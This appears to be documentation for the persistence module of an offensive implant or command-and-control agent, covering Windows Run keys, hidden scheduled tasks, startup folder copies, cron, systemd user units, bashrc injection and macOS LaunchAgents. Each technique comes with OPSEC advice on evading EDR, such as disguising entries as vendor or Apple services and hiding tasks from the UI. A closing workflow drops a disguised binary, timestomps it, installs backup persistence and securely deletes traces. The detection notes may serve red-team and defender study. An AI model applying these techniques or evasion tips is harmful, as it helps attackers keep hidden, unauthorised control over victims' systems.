# Persistence

Native `persist:*` commands backed by direct OS API calls. No `exec_os` wrappers, no Rhai scripts, no child-process spawning (exception: `persist:cron` on Linux and macOS, where writing the crontab file directly requires root).

## Quick Reference

| Command | Platform | ATT&CK | Admin? |
|---------|----------|--------|--------|
| `persist:run <name> <path>` | Windows | T1547.001 | No |
| `persist:run_hklm <name> <path>` | Windows | T1547.001 | Yes |
| `persist:task <name> <path>` | Windows | T1053.005 | No |
| `persist:startup <filename> <path>` | Windows | T1547.009 | No |
| `persist:cron <path>` | Linux, macOS | T1053.003 | No |
| `persist:systemd <name> <path>` | Linux | T1543.002 | No |
| `persist:profile <path>` | Linux | T1546.004 | No |
| `persist:launchagent <label> <path>` | macOS | T1543.001 | No |
| `persist:list` | All | — | No |

All install commands have a corresponding `_remove` variant (e.g. `persist:run_remove <name>`).

---

## Windows

### `persist:run` — Registry Run Key (T1547.001)

```
persist:run <value-name> <binary-path>
persist:run_hklm <value-name> <binary-path>
persist:run_remove <value-name>
persist:run_hklm_remove <value-name>
```

Writes a `REG_SZ` value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (or `HKLM\...` for the admin variant) via native `RegCreateKeyExW` / `RegSetValueExW`. No `reg.exe` child process is spawned.

**Triggered at:** User logon (Explorer reads HKCU Run on shell start).

**Detection surface:**
- Sysmon Event 12/13 (registry key/value create/modify) — the most commonly deployed rule in this category
- ETW `Microsoft-Windows-Kernel-Registry` (`SetValueKey` operation)
- Autoruns / SysInternals visibility

**OPSEC notes:**
- HKCU Run is the single most-watched persistence key; any EDR with a generic registry rule catches it immediately.
- The value name appears in `HKCU\...\Run` in plain text — pick a name that blends with the system (e.g. match an existing vendor entry).
- The binary path is stored as plaintext in the registry — if the binary is in a suspicious location (`%TEMP%`, `%USERPROFILE%\Downloads`) that's a secondary IOC.
- HKLM Run requires admin and is more visible than HKCU to defenders (change auditing is more commonly enabled on HKLM).

---

### `persist:task` — Scheduled Task (T1053.005)

```
persist:task <task-name> <binary-path>
persist:task_remove <task-name>
```

Creates a scheduled task via the COM `ITaskService` interface. The full task definition XML is passed to `ITaskFolder::RegisterTask` — no `schtasks.exe` child process is spawned. The task is configured with:
- **Trigger:** At logon (current user)
- **Principal:** Least privilege (no elevation)
- **Hidden:** `true` (suppressed from Task Scheduler MMC UI)
- **KeepAlive / restart:** `IgnoreNew` (won't pile up parallel instances)

**Triggered at:** User logon.

**Detection surface:**
- Windows Security Event **4698** ("A scheduled task was created") — logged if audit policy is enabled for Object Access → Scheduled Task
- ETW `Microsoft-Windows-TaskScheduler/Operational` Event **106** (task registered)
- Task XML visible at `%SystemRoot%\System32\Tasks\<name>`
- COM `ITaskService::Connect` then `RegisterTask` visible via ETW `Microsoft-Windows-RPC` to `taskschd.dll` 

**OPSEC notes:**
- COM-based creation (vs `schtasks.exe`) skips the noisy process-create event for `schtasks.exe` parented by your agent.
- Event 4698 requires the Audit Object Access policy to be enabled — many non-enterprise configurations don't have this.
- The task XML file in `%SystemRoot%\System32\Tasks\` is plaintext and inspectable by anyone with read access.
- The `<Hidden>true</Hidden>` setting conceals the task from the MMC snap-in but not from `Get-ScheduledTask` or the raw XML file.
- Tasks created with `InteractiveToken` logon type do not run as `SYSTEM`; they run in the user's session only.

---

### `persist:startup` — Startup Folder (T1547.009)

```
persist:startup <filename> <source-path>
persist:startup_remove <filename>
```

Copies the binary into the current user's startup folder:
`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`

Explorer executes all PE files (`.exe`, `.bat`, `.cmd`) in this folder at logon.

**Triggered at:** User logon (Explorer shell start).

**Detection surface:**
- Sysmon Event **11** (file create) — the startup folder is a common monitored path
- ETW `Microsoft-Windows-Kernel-File` (file create in startup path)
- Autoruns visibility

**OPSEC notes:**
- The startup folder is one of the first paths Autoruns and EDR behavioral engines check — high-confidence detection.
- Copying the binary (rather than creating a `.lnk` shortcut) means the PE hash is directly inspectable at rest.
- The filename must include the correct extension for Explorer to execute it (`.exe`).

---

## Linux

### `persist:cron` — Crontab (T1053.003)

```
persist:cron <binary-path>
persist:cron_remove <binary-path>
```

Appends an `@reboot <binary-path>` entry to the current user's crontab. Uses `crontab -l` to read the existing crontab and reloads via a temp file — idempotent (will not add a duplicate entry).

**Triggered at:** System boot.

**Detection surface:**
- Write to `/var/spool/cron/crontabs/<username>` (auditd: `-w /var/spool/cron -p w`)
- `crontab` binary execution (spawns a child process — the only unavoidable noise in this technique)
- `crond`/`cron.service` executing the binary at boot

**OPSEC notes:**
- The `crontab` binary invocation is visible as a child process of the agent. On systems with process auditing this creates a parent-child relationship IOC.
- The crontab file is world-unreadable (mode 600) but root can inspect all user crontabs.
- On systemd-based distros, consider `persist:systemd` instead — it avoids the child process entirely.

---

### `persist:systemd` — Systemd User Service (T1543.002)

```
persist:systemd <unit-name> <binary-path>
persist:systemd_remove <unit-name>
```

Writes a `.service` unit file to `~/.config/systemd/user/<name>.service` and creates a symlink in `default.target.wants/` to enable it. No `systemctl` child process is spawned — the unit is enabled by the symlink and activated on next login when `systemd --user` is started by PAM.

To start immediately without a reboot:
```
shell systemctl --user daemon-reload && systemctl --user start <unit-name>
```

**Triggered at:** User login (systemd --user session start).

**Detection surface:**
- File create in `~/.config/systemd/user/` — detectable via inotify/fanotify watches
- `journald` unit activation log: `systemctl --user status <unit-name>`
- EDR that watches systemd unit directories (less common than Windows equivalents)

**OPSEC notes:**
- No root required. No child process spawned during installation.
- The unit file and symlink are plaintext and easily discovered by `systemctl --user list-units`.
- `Restart=on-failure` in the unit means systemd will restart the binary if it crashes — useful for resilience, but also visible in `journald` restart events.
- On distros that use elogind instead of systemd (Alpine, Gentoo), this technique will not work — fall back to `persist:cron` or `persist:profile`.

---

### `persist:profile` — Shell Profile Injection (T1546.004)

```
persist:profile <binary-path>
persist:profile_remove <binary-path>
```

Appends a guarded launch block to `~/.bashrc` and `~/.profile`. The block checks if the binary exists and is not already running before launching it in the background:

```bash
# --- rcm-persist-start ---
if [ -f "/path/to/agent" ] && ! pgrep -x "agent" > /dev/null 2>&1; then
  "/path/to/agent" &
fi
# --- rcm-persist-end ---
```

The sentinel comments make removal precise and idempotent — re-running `persist:profile` will not add a second copy.

**Triggered at:** Interactive shell login (`.bashrc`), login shell (`.profile`).

**Detection surface:**
- File modification timestamp on `~/.bashrc`, `~/.profile`
- inotify/fanotify watch on home directory files
- Shell process spawning the agent binary as a background child

**OPSEC notes:**
- Does not fire for non-interactive shells (cron jobs, SSH commands run without a TTY). If the agent needs to survive those cases, combine with `persist:cron` or `persist:systemd`.
- The plaintext binary path appears in `~/.bashrc` — discoverable by any user with read access to the home directory.
- Not triggered for users with `zsh`, `fish`, or other non-bash shells unless `.profile` is sourced. For broad coverage, also inject into `~/.zshrc` or `~/.config/fish/config.fish` manually.

---

## macOS

### `persist:launchagent` — Launch Agent (T1543.001)

```
persist:launchagent <label> <binary-path>
persist:launchagent_remove <label>
```

Writes a plist to `~/Library/LaunchAgents/<label>.plist`. Launchd reads this directory on user login and starts all plists with `RunAtLoad = true`. `KeepAlive = true` causes launchd to restart the binary if it exits.

The plist is written with mode 0600. No admin required.

To load immediately without a re-login:
```
shell launchctl load ~/Library/LaunchAgents/<label>.plist
```

**Triggered at:** User login.

**Detection surface:**
- File create in `~/Library/LaunchAgents/` — monitored by Endpoint Security Framework (ESF) and most macOS EDRs
- Unified Log entry when launchd loads and activates the agent
- `launchctl list` shows all loaded agents including the label

**OPSEC notes:**
- `~/Library/LaunchAgents/` is one of the first places macOS security tools (Objective-See, EDRs) enumerate.
- The label appears in `launchctl list` in plaintext. Use a label that resembles a legitimate Apple or third-party service (e.g. `com.apple.softwareupdated`).
- `KeepAlive` causes rapid restarts if the binary exits/crashes, which generates repeated Unified Log entries — detectable by frequency analysis.
- System Integrity Protection (SIP) does not protect `~/Library/LaunchAgents/` — no admin or SIP bypass needed.
- `/Library/LaunchAgents/` (system-wide, requires admin) and `/Library/LaunchDaemons/` (root, runs without user session) are not implemented — add as future work if admin sessions are available.

---

## Workflow: Full persistence chain

```bash
# 1. Drop the binary to a stable location
file:write|/home/user/.local/bin/sysmond|<base64>
shell chmod +x /home/user/.local/bin/sysmond

# 2. Apply a plausible timestamp (copy from a nearby system binary)
timestomp /home/user/.local/bin/sysmond /bin/bash

# 3. Install primary and backup persistence
persist:systemd sysmond /home/user/.local/bin/sysmond
persist:profile /home/user/.local/bin/sysmond

# 4. Verify
persist:list
```

## Cleanup

```bash
persist:systemd_remove sysmond
persist:profile_remove /home/user/.local/bin/sysmond
secure_delete /home/user/.local/bin/sysmond
```
